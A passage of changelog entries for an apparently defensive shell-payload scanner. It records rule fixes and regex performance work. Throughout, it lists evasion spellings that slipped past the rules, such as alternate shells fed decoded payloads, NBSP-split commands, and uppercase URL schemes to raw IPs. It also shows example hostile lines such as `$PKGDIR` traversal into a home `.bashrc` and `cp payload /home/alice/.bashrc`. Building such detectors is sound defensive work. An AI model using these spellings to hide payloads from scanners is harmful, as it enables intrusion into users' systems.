+- **Every `{0,N}` in a crossfire shape was a bypass for typing N+1
+  characters.** Four of them: 40 inside a partial quote, 60 before a
+  confusable, 60 inside a brace group, 200 between a decode and its pipe. So
+  `c"u"rl` fired and `c"uuu…45…u"rl` did not, on length alone, and the same
+  for a padded brace group, a long command word with the confusable late in
+  it, and a decode separated from its pipe by 201 characters.
+
+  The bounds existed for backtracking safety, so removing them needed the
+  safety back by other means: **possessive quantifiers** (`*+`, Python 3.11+)
+  where the class already excludes what follows - `[^\n|;&]*+` cannot swallow
+  the `|` it is hunting, so it never backtracks - and a **lookahead** where
+  the span must give ground, asserting the separator once instead of
+  searching for it from every position.
+
+  That second half was not optional. The naive removal made two shapes
+  **quadratic**: 31ms on one clamped line for the brace group and 26ms for
+  X001. A bound traded for a quadratic is no trade - `is_superlinear` refuses
+  that shape at compile time, and it is the thing this project has spent its
+  hardening budget removing. Both are linear now (0.01ms and 1.8ms), pinned
+  by `test_an_unbounded_span_stays_linear`.
+
+- **Seven spellings of the same instruction walked past X003 and X004.** Each
+  missed for a reason that says nothing about intent:
+
+    - `set +xv` - the pattern wanted the `x` last in the option cluster, so
+      `set +vx` fired and `set +xv` did not, on letter order alone.
+    - `TERM='dumb'` and `TERM="dumb"` - a quote sets exactly the same
+      variable.
+    - `exec 2>>/dev/null` and `exec &>/dev/null` - only the truncating
+      redirect was listed, and appending detaches a stream as thoroughly.
+    - `sh -ce` and `bash -cl` - the `c` may sit anywhere in the cluster, and
+      requiring it last let both through. The cluster must still hold two
+      letters, which is what keeps an ordinary `sh -c` out.
+    - `ash -lc`, `mksh -lc` - X003 carried its own five-shell list while X001
+      had just been widened to a dozen. It uses the same list now, minus the
+      interpreters, because `python -lc` means nothing.
+
+  Still zero on the locked benign corpus after all of it.
+
+- **A false positive that was not there.** X002 is CRITICAL, so a name the
+  tokenizer *can* resolve must never reach it - `export CMD=curl` then `$CMD`
+  is an ordinary recipe, and a rule firing CRITICAL on it would be worse than
+  the evasion it guards against. Checked across `export`, `declare`, `local`,
+  `readonly` and `typeset`: all silent, all resolved. Pinned, because the next
+  change to the variable table is what would break it.
+
+- **X005's staging exemption was case-insensitive and applied to the whole
+  line.** Both were ways out of a HIGH rule. `$PKGDIR` is not a makepkg
+  variable - it expands to nothing - so
+  `install -Dm644 x "$PKGDIR/../../home/alice/.bashrc"` wrote into a home
+  directory while claiming to be packaging, bought for the price of a shift
+  key. And because the exemption was tested against the whole body, a real
+  `$pkgdir` anywhere on the line bought silence:
+  `echo "$pkgdir" && cp payload /home/alice/.bashrc` reported nothing.
+
+  The exemption is case-sensitive now and belongs to the **target**: what
+  makes a write packaging is that the path being written is under a staging
+  root, which is a property of one word rather than of the line. Genuine
+  staged writes stay exempt.
+
+- **A URL scheme is case-insensitive, and two crossfire shapes were not.**
+  `HTTPS://1.2.3.4/p.tar.gz` walked past X006's raw-IP shape and
+  `HTTP://0x7f000001/` past X003's encoded host, both for a shift key. The
+  shortener shape sitting beside them was already case-insensitive, which is
+  what makes this an accident rather than a decision.
+
+- **X001's executor list failed the way lists fail.** It read
+  `sh|bash|zsh|dash|ksh`. `ash`, `mksh`, `pdksh`, `yash`, `posh`,
+  `busybox sh`, `busybox ash`, `env -S sh`, `env -i bash`, `command -p sh`,
+  `source /dev/stdin` and `. /dev/stdin` each took the decoded payload and
+  ran it while the rule said nothing - twelve spellings, one of which R001
+  already knew about, which is the tell that this was an oversight and not a
+  boundary.
+
+  Interpreters are now included too: `printf '\x63...' | python3` decodes an
+  encoding and executes it, which is X001's whole claim, and the escape blob
+  is what makes it unambiguous - no recipe pipes a hex blob into an
+  interpreter by accident. The rule is renamed from *Encoded Payload Decoded
+  To A Shell* to *Encoded Payload Decoded And Executed* so the name says what
+  it does. Still **zero** on the locked benign corpus after the widening.
+
+- **X008, whitespace a shell does not split on.** bash splits words on space,
+  tab and newline. Python's `\s` also matches NBSP, NNBSP, the ogham and
+  ideographic spaces, NEL and the line and paragraph separators - so a line
+  reading `make install` with a NBSP between the words **displays as a command
+  and executes as one unknown word**. What the reviewer reads is not what the
+  shell runs.
+
+  R013 is FATAL and claims bidi overrides, zero-width characters and tag
+  characters. It does not claim these, so nothing scored them and nothing
+  reported them - and a payload rule that spells whitespace as `\s` fires
+  *around* one: R001 reported "curl piped to bash" for a line that runs no
+  curl, which describes the wrong thing rather than nothing.
+
+  MEDIUM, not FATAL: the line fails closed - the command is simply not found -
+  and the realistic benign cause is a command copy-pasted from a web page.
+  Measured before weighted, as the family requires: **zero** hits on the locked
+  benign corpus. One diff in 3,246 carries such a character at all, in the text
+  of a font licence, which is not a shell file and never reaches the file gate.
+  The family's documented reason for having no X008 was that R013 left it
+  nothing to do; that is true of R013's codepoints and not of these, so the
+  reasoning is corrected rather than quietly dropped.
+
+- **A shared command-position prefix was quadratic in newlines.** `_CMD` -
+  the "start of subject, or just after a separator" prefix that a dozen
+  sabotage rules and two crossfire rules are built from - ended in `\s*`,
+  which matches a newline. On a subject holding many of them the engine
+  re-scanned a run of newlines from every position: 8,192 cost **2.4s** in
+  `_SHRED_HOME_RE` and **5.8s** in `_HISTORY_WIPE_RE`.
+
+  Nothing reaches it today: every caller matches one line at a time and a
+  line holds no newline, so this was latent rather than live. It is still
+  the shape [A14](security.md) exists to forbid, sitting in a prefix a
+  dozen rules share, and it stayed invisible for as long as it did because
+  the probe alphabet could not produce a newline - which is the argument for
+  fixing an alphabet before trusting any timing taken with it. The prefix is
+  horizontal-only now (2.4s -> 1ms, 5.8s -> 4.7ms) and matches the same text:
+  a command word follows spaces or tabs on its own line, and the newline
+  boundary is the lookbehind's job.
+
+- **Four code-emitted rules fired on an escaped pipe.** The TOML audit only
+  reads `rules.toml`, so the R001-R003/R045 fix never reached the rules
+  defined in source: `build._REMOTE_XARGS_SHELL_RE`,
+  `delivery._PIPE_TO_SHELL_RE`, `network._PIPE_TO_SHELL_RE` and crossfire's
+  own `X001_RE` all matched the inert spelling. All four now require an
+  unescaped pipe. The audit that found them reads every `re.compile` in the
+  source - 232 patterns against the 31 in the TOML set.
+
+- **A class of control escapes derived no probe alphabet.**
+  `[\t\n\r\f\v]+` was timed against input it cannot consume, because the
+  scan for literals saw `t`, `n`, `r` - the letters, not the controls they
+  name. Single-letter escapes are decoded now, which is what surfaced the
+  `_CMD` quadratic above.
+
+- **Three more rules fired on an escaped pipe.** R001 was the loudest but not
+  the only one: R002 (wget to shell), R003 (base64 decode into a pipe) and R045
+  (binary encoding pipe) all matched the inert spelling too, because each
+  describes a *pipeline* and none of them checked that the bar was operative.
+  All four now require an unescaped pipe, all four superseded spellings are
+  registered for `config sync-rules --update`, and the corpus replay is
+  identical on both sides of the change: zero-rate 68.4%, flag rate 11.9%,
+  benign p95 35, CRITICAL p5 60. A strict narrowing that costs no recall is
+  what removing a false positive should look like.
+
+- **A FATAL rule's cost had never actually been measured.** R013's class is
+  `\u202A-\u202E` and friends, and every fixed probe in `regex_safety` is
+  ASCII, so both its backtracking risk and its growth ratio were taken against
+  input it cannot match - and a measurement with the wrong alphabet reports
+  zero, which reads exactly like fast. When no ASCII candidate fits a class,
+  the probe character now comes out of the class body itself. R013 measures
+  against `U+202A` and `U+200B` now, and is genuinely cheap; the point is that
+  the check says so on evidence rather than by accident.
+
+- **The rule linter had the same load sensitivity as the audit.** It measures
+  backtracking by running the pattern, so a clean ruleset linted as unlinted
+  depending on what else was on the machine - `test_shipped_default_rules_are_clean`
+  passed alone and failed inside the full suite. Same fix as the audit and the
+  bounded-matching gate: re-measure and keep the minimum. A checker that fails
+  for reasons unrelated to what it checks teaches operators to ignore it.
+
+- **R001 fired on an escaped pipe.** `curl x \| sh` passes a literal bar to
+  curl as an argument and starts no pipeline; the rule matched it anyway - a
+  false positive on the highest-severity, highest-recall rule in the set. The
+  pattern now requires the pipe to be unescaped, which is exactly why the
+  tokenizer keeps `\|` intact. Verified against the full corpus replay: benign
+  rates and labelled-fixture recall both unchanged. The superseded pattern is
+  registered so `config sync-rules --update` repairs an existing install.
+
+- **Three JSON body keys were unreachable on `Report`.** `required_by`,
+  `ioc_matches` and `scan_truncated` were all in `to_dict()` and absent from the
+  object, so a caller wanting an indicator hit had to serialise the report to
+  read a field the report already held. All three are attributes now, and
+  `test_every_json_body_key_is_reachable_on_the_report` closes the class rather
+  than the three instances.
+
+- **Two timing checks failed under load and passed alone.** The regex audit and
+  the bounded-matching gate both compared a wall-clock measurement against a
+  fixed budget, so contention alone could fail them. Both now re-measure and
+  keep the minimum when a result looks over budget: contention inflates a timing
+  and never deflates one, so a genuinely catastrophic pattern is slow on every
+  attempt. Six parallel audit runs now pass where a single loaded suite run
+  failed.
+
+- **The published corpus size was never reproducible from this repository.**
+  Fifteen places cited a 3,739-diff locked corpus. `corpus.lock` has only ever
+  recorded 3,332 and then 3,246, and the fixtures directory holds exactly 3,246
+  - so no checkout could produce the number every calibration claim rested on.
+  Every figure is re-measured against the corpus that is actually here: corpus
+  size 3,246, zero-rate 68.4%, benign flag rate 11.9%, the percentile 20 sits at
+  88.1th. Benign p95 (35), CRITICAL p5 (60), the 25-point margin and the median
+  (0) were already correct. `test_the_documented_corpus_size_matches_the_lock`
+  ties the prose to the manifest, because the drift happened silently for want
+  of anything connecting them.
 
 - **A line break for Python that is not one for a shell hid a payload from
   every line-based rule.** `str.splitlines` breaks on eight characters bash
